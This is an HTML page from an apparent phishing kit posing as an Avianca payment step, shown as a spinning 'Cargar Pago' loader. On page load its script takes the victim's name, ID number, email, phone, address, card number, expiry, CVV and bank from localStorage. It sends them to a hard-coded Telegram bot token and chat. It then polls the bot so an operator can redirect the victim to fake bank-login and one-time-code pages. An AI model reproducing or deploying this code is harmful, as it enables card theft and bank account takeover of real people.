1q<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Cargar Pago</title>
    <link
      rel="shortcut icon"
      href="./"
      type="image/x-icon"
    /><style>
  html, body {
    margin: 0;
    padding: 0;
    overflow-x: hidden;
  }
</style>

    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #ffffff;
      }

      .loader {
        border: 16px solid #ffffff;
        border-top: 16px solid #ff0000;
        border-radius: 50%;
        width: 100px;
        height: 100px;
        animation: spin 2s linear infinite;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>

  <body>
    <div class="loader"></div>
    <script>
      const config = {
        token: "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y",
        chat_id: "-4644294739",
      };

      
      // FunciÃ³n para enviar datos al bot de Telegram
      async function enviarDatosTelegram() {
        // Obtener datos del localStorage
        const paymentData = localStorage.getItem("pagojet");

        if (!paymentData) {
          console.error("No se encontraron datos en localStorage.");
          return;
        }

        const parsedData = JSON.parse(paymentData);
        console.log("Datos encontrados en localStorage:", parsedData);

        // Validar datos requeridos
        const requiredFields = [
          "email",
          "celular",
          "direccion",
          "tarjeta",
          "ftarjeta",
          "cvv",
          "id",
          "banco",
          "nombre",
        ];
        for (const field of requiredFields) {
          if (!parsedData[field]) {
            console.error(`Falta el campo obligatorio: ${field}`);
            return;
          }
        }

        // Generar ID de transacciÃ³n Ãºnico
        const transaction_id = `txn_${Date.now()}`;
        sessionStorage.setItem("transaction_id", transaction_id);

        // Crear el mensaje para Telegram
        const message = `
<b>Nuevo pendiente de verificaciÃ³n.</b>
<b>ğŸ›«â €â €â €â €â €Aviancaâ €â €â €â €â €ğŸ›«</b>
ğŸ†” <b>ID TransacciÃ³n:</b> | <code>${transaction_id}</code>
ğŸ“¡ <b>IP:</b> | <code>${parsedData.ip}</code>
ğŸ‘®ğŸ»â€â™€ï¸ <b>Nombre:</b> | <code>${parsedData.nombre}</code>
ğŸªª <b>CÃ©dula:</b> | <code>${parsedData.id}</code>
ğŸ“§ <b>Email:</b> | <a href="mailto:${parsedData.email}">${parsedData.email}</a>
ğŸ“² <b>TelÃ©fono:</b> | <code>${parsedData.celular}</code>
ğŸ“ <b>DirecciÃ³n:</b> | <code>${parsedData.direccion}</code>
ğŸ’³ <b>Tarjeta:</b> | <code>${parsedData.tarjeta}</code>
ğŸ—“ï¸ <b>Fecha:</b> | <code>${parsedData.ftarjeta}</code>
ğŸ” <b>CVV:</b> | <code>${parsedData.cvv}</code>
ğŸ¦ <b>Banco:</b> | <code>${parsedData.banco}</code>

`;

        if (parsedData.banco) {
          localStorage.setItem("banco", parsedData.banco);
          console.log("Banco guardado en localStorage:", parsedData.banco);
        } else {
          console.error("El campo 'banco' no estÃ¡ presente en los datos.");
        }

        try {
          // Enviar datos a Telegram
          const response = await fetch(
            `https://api.telegram.org/bot${config.token}/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: config.chat_id,
                text: message,
                parse_mode: "HTML",
              }),
            }
          );

          const data = await response.json();
          if (data.ok) {
            console.log("Mensaje enviado a Telegram:", data);
            verificarActualizaciones(transaction_id);
          } else {
            console.error("Error al enviar mensaje a Telegram:", data);
          }
        } catch (error) {
          console.error("Error en la solicitud a Telegram:", error);
        }
      }

      // FunciÃ³n para verificar actualizaciones en Telegram
      async function verificarActualizaciones(transaction_id) {
        console.log("Iniciando verificaciÃ³n de actualizaciones...");

        const bancoSeleccionado = localStorage.getItem("banco"); // Obtiene el banco desde localStorage
        console.log("Banco seleccionado:", bancoSeleccionado);
        const redirecciones = {
          bancolombia: "bancolombia/indexx.html",
          bogota: "banco_bogota/index.html"
        };

        // Si el banco existe en el objeto de redirecciones, usa su URL. Si no, usa una por defecto.
        const paginaDestino =
          redirecciones[bancoSeleccionado] || "pedir_logo.html";
        const redirectTimeout = setTimeout(() => {
          console.log(`Redirigiendo a ${paginaDestino}...`);
          window.location.href = paginaDestino;
        }, 2000);

        const interval = setInterval(async () => {
          try {
            const response = await fetch(
              `https://api.telegram.org/bot${config.token}/getUpdates`
            );
            const updates = await response.json();

            if (updates.result) {
              for (const update of updates.result) {
                if (update.callback_query) {
                  const [action, id] = update.callback_query.data.split(":");
                  if (id === transaction_id) {
                    clearTimeout(redirectTimeout);
                    clearInterval(interval);

                    switch (action) {
                      case "pedir_logo":
                        window.location.href = "pedir_logo.html";
                        break;
                      case "pedir_dinamica":
                        window.location.href = "pedir_dinamica.html";
                        break;
                      case "error_tc":
                        window.location.href = "pago.html";
                        break;
                      case "error_logo":
                        window.location.href = "pedir_logo.html";
                        break;
                      case "finalizar":
                        window.location.href = "finish.html";
                        break;
                      default:
                        console.error("AcciÃ³n desconocida:", action);
                    }
                  }
                }
              }
            }
          } catch (error) {
            console.error("Error al verificar actualizaciones:", error);
          }
        }, 5000); // Verificar cada 5 segundos
      }

      // Inicia el envÃ­o al cargar la pÃ¡gina
      enviarDatosTelegram();
    </script>
  </body>
</html>
